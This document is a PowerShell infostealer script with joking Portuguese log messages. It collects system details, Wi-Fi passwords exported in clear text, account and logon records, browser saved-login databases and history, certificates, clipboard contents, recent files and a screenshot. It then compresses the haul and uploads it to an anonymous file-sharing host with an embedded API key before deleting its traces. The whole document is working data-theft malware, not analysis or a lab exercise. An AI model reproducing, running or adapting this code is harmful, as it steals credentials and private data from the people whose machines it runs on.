# ---------- KIT v7.0 – “Festa do Coringa” ----------
$ErrorActionPreference = "Stop"
$kit     = "$env:TEMP\kit"
$key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$upUrl   = "https://api.anonfilesnew.com/upload?key=$key"
$logFile = "$env:TEMP\kit_log.txt"
$7z      = "$env:TEMP\7za.exe"
$user    = $env:USERNAME

function Write-Log ($msg) {
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts  $msg" | Tee-Object -FilePath $logFile -Append
}

# 0) Garante 7za.exe
if (!(Test-Path $7z)) {
    Write-Log "🍺 [Balada] $user, pera aí que vou pegar o 7za.exe no bar..."
    Invoke-WebRequest "https://www.7-zip.org/a/7za920.zip" -OutFile "$env:TEMP\7za920.zip"
    Expand-Archive "$env:TEMP\7za920.zip" "$env:TEMP" -Force
    Move-Item "$env:TEMP\7za.exe" $7z -Force
}

Write-Log "🎉 [OnlyFans] $user acabou de abrir a live privada em $env:COMPUTERNAME"
New-Item -ItemType Directory -Path $kit -Force | Out-Null

# 1) Sistema & HW
Write-Log "🌿 [MaconhaLand] $user, vou verificar se seu PC fuma mais que você..."
systeminfo | Out-File "$kit\sysinfo.txt" -Encoding UTF8
Get-CimInstance Win32_ComputerSystem | Out-File "$kit\hw.txt" -Encoding UTF8
Get-CimInstance Win32_Processor | Out-File "$kit\cpu.txt" -Encoding UTF8
Get-CimInstance Win32_BIOS | Out-File "$kit\bios.txt" -Encoding UTF8

# 2) Rede & Wi-Fi
Write-Log "📡 [CrackNet] $user, exportando Wi-Fi da vizinha que nunca pagou internet..."
Get-NetIPConfiguration | Out-File "$kit\netip.txt" -Encoding UTF8
cmd /c "netsh wlan export profile key=clear folder=$kit"

# 3) Contas & privilégios
Write-Log "👮 [Narcocheck] $user, fuçando admins pra ver quem vende o controle do Xbox..."
Get-CimInstance Win32_UserAccount | Out-File "$kit\users.txt" -Encoding UTF8
net localgroup administradores | Out-File "$kit\admins.txt" -Encoding UTF8
$secLog = Get-WinEvent -ListLog Security -EA SilentlyContinue
if ($secLog -and $secLog.RecordCount) {
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -Max 200 -EA SilentlyContinue |
        Select TimeCreated,Id,LevelDisplayName,Message |
        Out-File "$kit\logons.txt" -Encoding UTF8
} else {
    "Log Security trancado com cadeado do tráfico" | Out-File "$kit\logons.txt" -Encoding UTF8
}

# 4) Navegadores
Write-Log "🍑 [PornHub] $user, vasculhando aba anônima que você jurou que era ‘trabalho’..."
@(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*\logins.json",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
) | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -EA SilentlyContinue }

# 5) Certificados
Write-Log "💳 [CartelByte] $user, exportando certificados de site de delivery de erva..."
Get-ChildItem Cert:\CurrentUser\My |
    Select Subject,Thumbprint,NotAfter |
    Out-File "$kit\mycerts.txt" -Encoding UTF8

# 6) Clipboard
Write-Log "📝 [BocaDeFumo] $user, lendo última receita de brownie que você copiou..."
Get-Clipboard | Out-File "$kit\clipboard.txt" -Encoding UTF8

# 7) Recentes
Write-Log "🗂️ [DealerDocs] $user, listando arquivos recentes (até aquele chamado ‘receita.pptx’)..."
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue |
    Select Name,LastWriteTime |
    Out-File "$kit\recent.txt" -Encoding UTF8

# 8) Screenshot
Write-Log "📸 [SnapFoda] $user, tirando print antes que você minimize a aba ‘como plantar cannabis’..."
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width,$screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen(0,0,0,0,$bmp.Size)
$pathSS = "$kit\screenshot.jpg"
$bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
[System.GC]::Collect(); Start-Sleep -Milliseconds 200

# 9) Compactação 7Z com logs fake
Write-Log "🗜️ [Compressolandia] $user, prensando a erva digital..."
Start-Sleep -Seconds 1
Write-Log "🧂 [PrenSertanejo] $user, adicionando fotos da ex fumando..."
Start-Sleep -Seconds 1
Write-Log "🌬️ [Vaporwave] $user, ocultando pasta ‘Sementes 2026’..."
$arc = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).7z"
& $7z a -t7z -mx=9 -y $arc "$kit\*" | Out-Null

if (Test-Path $arc) {
    $size = (Get-Item $arc).Length
    Write-Log "✅ [Vaporizou] $user, beck pronto: $arc ($size bytes)"
} else {
    Write-Log "❌ [ErroDeBong] $user, o baseado caiu no chão – arquivo 7z falhou"
    exit 1
}

# 10) Upload
Write-Log "🚀 [TraficoCloud] $user, fazendo o corre pro AnonFiles..."
try {
    $curl = 'curl.exe -s -X POST -F "file=@' + $arc + '" ' + $upUrl
    $reply = cmd /c $curl
    Write-Log "[UP] Resposta: $reply"
    if ($reply -match '"full":"([^"]+)"') {
        Write-Log "🤑 [Entregue] $user, o baseado chegou – link: $($matches[1])"
    } else {
        Write-Log "😵 [Biqueira] $user, a boca foi descoberta – falha na URL"
    }
} catch {
    Write-Log "🤯 [Overdose] $user, deu ruim no upload: $_"
}

# 11) Limpeza
Write-Log "🧹 [DealerClean] $user, limpando cinza e palitinho da área..."
Remove-Item $kit,$arc -Recurse -Force -EA SilentlyContinue
Write-Log "🏁 [FimDaFesta] $user, a rave acabou – log em $logFile"
